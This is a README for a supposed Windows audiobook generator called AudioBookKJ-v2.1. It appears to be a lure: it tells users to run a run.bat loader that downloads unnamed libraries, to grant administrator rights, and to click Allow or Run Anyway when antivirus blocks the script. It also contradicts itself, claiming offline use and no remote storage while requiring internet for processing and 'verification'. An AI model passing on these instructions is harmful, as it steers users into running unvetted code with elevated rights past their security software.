## 📌 Overview

AudioBookKJ-v2.1 turns text into spoken audiobooks. It helps you convert written stories, articles, or scripts into professional sound files. This software runs on your Windows computer. It uses artificial intelligence to generate natural speech. You keep your files on your hard drive. This keeps your data private. You control the pace, the tone, and the final quality of your audio project.

## ⚙️ System Requirements

To run this application, your computer needs these basic items:

*   Operating System: Windows 10 or Windows 11.
*   Processor: A modern multi-core processor from Intel or AMD.
*   Memory: At least 8GB of RAM.
*   Storage: 2GB of free space on your hard drive.
*   Internet Connection: Required for the first setup and file processing.

## 🛠️ Running the Application

Once you extract the files, perform these actions to start the program.

1.  Locate the file named `run.bat` in the main folder.
2.  Double-click `run.bat`.
3.  A black window called the command prompt will appear.
4.  The script identifies if your computer has the necessary tools like Python, Node.js, and FFmpeg.
5.  If a tool is missing, the script asks for permission to install it using the Windows Package Manager. Follow the prompts on the screen.
6.  The loader downloads internal libraries to help the software function. This may take a few minutes based on your internet speed.
7.  Once the setup finishes, the main interface opens in your web browser.

## 🗣️ Using the Interface

The interface acts as a dashboard for your projects. You will see a text box for your source material. Paste the content of your book here. Choose your preferred voice style from the drop-down menu. Press the Generate button to start the audio processing. The software saves the file into an output folder once the work is complete. You can play this file on any standard audio player.

## 🗃️ Managing Your Files

Your generated audio files reside in the folder named `output`. You can rename these files at any time. If you run out of disk space, delete old files from this folder. The software does not store your content on a remote server. You have full ownership of every file created by this tool.

## 🔧 Troubleshooting Common Issues

If the application fails to start:

*   Check your internet connection. A stable connection ensures the software verifies its components.
*   Ensure you have administrator rights on your Windows account. The installer requires these rights to add helper tools to your system.
*   Verify that your antivirus software is not blocking the `run.bat` file. Some security settings block scripts to protect your machine. You may need to select Allow or Run Anyway if a warning window appears.
*   Restart your computer. A simple restart resolves most path errors or locked file issues.

## 🌟 Customizing Your Setup

You can adjust how the voice sounds by editing settings inside the menu bar. Look for the configuration tab. You can change the speed of the speech. You can also adjust the pitch to make the voice sound deeper or higher. Try these settings on a short snippet of text first. This helps you find the audio profile you prefer before processing a full book.

## 📚 Frequently Asked Questions

Does this software work offline?
Yes. Once the initial components install, you can process text files without an active internet connection.

What file formats can I use for input?
The current version supports plain text files. You can copy and paste text directly from Word files or web pages into the application.

Does the software support multiple languages?
Yes. The speech engine adjusts to different character sets. Some voices sound more natural than others depending on the language selected.

Is there a limit to the length of the book?
There is no hard limit, but large files take longer to process. We suggest breaking very long books into chapters. This makes file management easier and improves processing speed.

How do I remove the program?
Delete the main folder you created during the extraction step. The software does not place hidden files or registry keys in your Windows system. This makes the removal process clean and simple.
